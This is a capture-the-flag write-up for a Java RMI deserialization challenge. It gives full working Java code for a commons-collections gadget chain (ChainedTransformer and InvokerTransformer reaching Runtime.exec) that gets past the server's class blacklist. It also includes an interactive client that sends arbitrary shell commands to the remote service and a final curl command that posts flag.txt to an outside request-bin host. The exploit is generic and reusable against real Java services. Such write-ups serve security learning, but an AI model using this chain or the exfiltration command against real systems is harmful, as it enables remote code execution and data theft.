# array list (pwn, 350p)

the task is similar to https://github.com/p4-team/ctf/tree/master/2018-01-20-insomnihack/pwn_magic_hat and a bit to https://github.com/p4-team/ctf/tree/master/2016-08-21-bioterra-ctf/akashic_records

in short: we have a java rmi server running, and we need to craft a deserialization chain to exploit this server.
we get a [client](client.jar) and [library](notsoserial-modified.jar) which is added on the server.
we can add those jars to intellij project and it will decompile the code on the fly for us.

client is trivial, it connects to the server and uses the remote api.
the api is:

```java
public interface service extends remote {
    store getstore() throws remoteexception;

    store createarraylist(store var1) throws remoteexception;

    store createfastarraylist(store var1) throws remoteexception;

    string getstring(store var1, int var2) throws remoteexception;

    store addrandom(store var1, int var2) throws remoteexception;
}
```

and store class is:

```java
import java.io.serializable;
import java.util.arraylist;
import java.util.collection;
import org.apache.commons.collections.fastarraylist;

public class store implements serializable {
    private static final long serialversionuid = -878586296715953149l;
    public collection[] collections = new collection[10];
    public int counter = 0;
    private static final int max_collections = 10;

    public store() {
    }

    public int createarraylist() {
        if (this.counter == 10) {
            return 0;
        } else {
            arraylist<integer> list = new arraylist();
            this.collections[this.counter++] = list;
            return 1;
        }
    }

    public int createfastarraylist() {
        if (this.counter == 10) {
            return 0;
        } else {
            fastarraylist list = new fastarraylist();
            this.collections[this.counter++] = list;
            return 1;
        }
    }

    public int insert(int index, object obj) {
        if (index >= 0 && index < 10) {
            if (this.collections[index] == null) {
                return 0;
            } else {
                this.collections[index].add(obj);
                return 1;
            }
        } else {
            return 0;
        }
    }
}
```

store class is the one we need to use for the exploit, since it's the object we can send to the server and server will deserialize it.
we can see that it contains an array of collections, and we will use a very particular collection to exploit the server.

there is one small obstacle:

```java
        this.blacklist.add(this.internalname("java.lang.reflect.invocationhandler"));
        this.blacklist.add(this.internalname("org.apache.commons.beanutils.beancomparator"));
        this.blacklist.add(this.internalname("org.apache.commons.collections.map.lazymap"));
        this.blacklist.add(this.internalname("org.apache.commons.collections4.comparators.transformingcomparator"));
        this.blacklist.add(this.internalname("org.apache.commons.collections4.functors.instantiatetransformer"));
        this.blacklist.add(this.internalname("org.apache.commons.collections.keyvalue.tiedmapentry"));
        this.blacklist.add(this.internalname("org.apache.commons.fileupload.disk.diskfileitem"));
        this.blacklist.add(this.internalname("org.apache.commons.io.output.deferredfileoutputstream"));
        this.blacklist.add(this.internalname("org.hibernate.tuple.component.abstractcomponenttuplizer"));
        this.blacklist.add(this.internalname("com.sun.rowset.jdbcrowsetimpl"));
        this.blacklist.add(this.internalname("org.jboss.interceptor.proxy.interceptormethodhandler"));
        this.blacklist.add(this.internalname("sun.rmi.transport.tcp.tcpendpoint"));
        this.blacklist.add(this.internalname("sun.rmi.server.activationgroupimpl"));
        this.blacklist.add(this.internalname("javax.xml.transform.templates"));
        this.blacklist.add(this.internalname("java.lang.reflect.modifier"));
        this.blacklist.add(this.internalname("java.net.urlconnection"));
        this.blacklist.add(this.internalname("org.apache.commons.collections.functors.instantiatetransformer"));
        this.blacklist.add(this.internalname("org.apache.commons.collections4.functors.instantiatetransformer"));
        this.blacklist.add(this.internalname("org.codehaus.groovy.runtime.convertedclosure"));
        this.blacklist.add(this.internalname("org.codehaus.groovy.runtime.methodclosure"));
        this.blacklist.add(this.internalname("org.springframework.beans.factory.objectfactory"));
        this.blacklist.add(this.internalname("com.sun.org.apache.xalan.internal.xsltc.trax.templatesimpl"));
```

so we can't use some of the classes.
server can create for us `org.apache.commons.collections.fastarraylist` which means there has to be commons-collections on the server.

specifically we will use `transformedset` decorator.
to use it we need a `set` and `transformer`.
the idea is that every time we add something to this `transformedset`, the actual value stored will be a result of calling transformer on the passed value.
a useful transformer is `chainedtransformer`, which calls multiple transformers in a chain.
we will also need `constanttransformer` which simply returns a constant value every time, and finally `invokertransformer` which can call functions.

what we want to call in the end is `runtime.getruntime().exec("command")`.

constanttransformer has to actually return and object so we will pass there `runtime.class` metaclass object so we need `new constanttransformer(runtime.class)`

from there we can use reflection to get handle of a method by calling `.getmethod("getruntime")` so the code will be `new invokertransformer("getmethod", new class[]{string.class, class[].class}, new object[]{"getruntime", new class[0]})`

now we actually want to invoke this `getruntime` to get handle of the `runtime` object, so we need `new invokertransformer("invoke", new class[]{object.class, object[].class}, new object[]{null, new object[0]})`

finally we want to run `exec("command")` function of the runtime class, so we do `new invokertransformer("exec",new class[]{string.class}, new string[]{command})`

keep in mind we need to return some value from this transformerchain, so it can get stored in the set in the end, so we simply pass another constanttransformer.
as a result we have:

```java
public static store preparepayload(final string command) {
	final transformer[] transformers = new transformer[]{
			new constanttransformer(runtime.class),
			new invokertransformer("getmethod", new class[]{
					string.class, class[].class}, new object[]{
					"getruntime", new class[0]}),
			new invokertransformer("invoke", new class[]{
					object.class, object[].class}, new object[]{
					null, new object[0]}),
			new invokertransformer("exec",
					new class[]{string.class}, new string[]{command}),
			new constanttransformer(1)};
	final transformer transformerchain = new chainedtransformer(transformers);
	set<integer> backingset = new hashset<>();
	set transformedset = transformedset.decorate(backingset, transformerchain);
	store store = new store();
	store.collections[0] = transformedset;
	return store;
}
```

it's very useful that the server has `addrandom` method, which adds something to the collection we provide.
otherwise we would need a bit more magic, to store values on our side, without invoking the transformer chain.
this would require adding a "fake" transformer, adding values and then substituting the transformer for the chain, using reflection (so it doesn't trigger).
fortunately we can simply send empty set, and ask server to add values, which will trigger the chain.

now we just need to connect to the remote endpoint and start sending commands:

```java
public static void main(final string[] args) throws exception {
	system.setproperty("org.apache.commons.collections.enableunsafeserialization", "true");
	registry registry = locateregistry.getregistry(inetaddress.getbyname("arraylist.dhavalkapil.com").gethostname(), 9999);
	service service = (service) registry.lookup("backdoor");
	scanner sc = new scanner(system.in);
	while (true) {
		system.out.print("> ");
		execcommand(service, sc.nextline());
	}
}

private static void execcommand(service service, string command) {
	try {
		service.addrandom(preparepayload(command), 0);
	} catch (exception e) {
		e.printstacktrace();
	}
}
```

we know the flag is in `flag.txt` file so we can just grab it with simple `curl -d @flag.txt -x post https://requestb.in/xxxxx` and we get `ctf{j4v4_64d637_ch41n1n6_15_fun}`

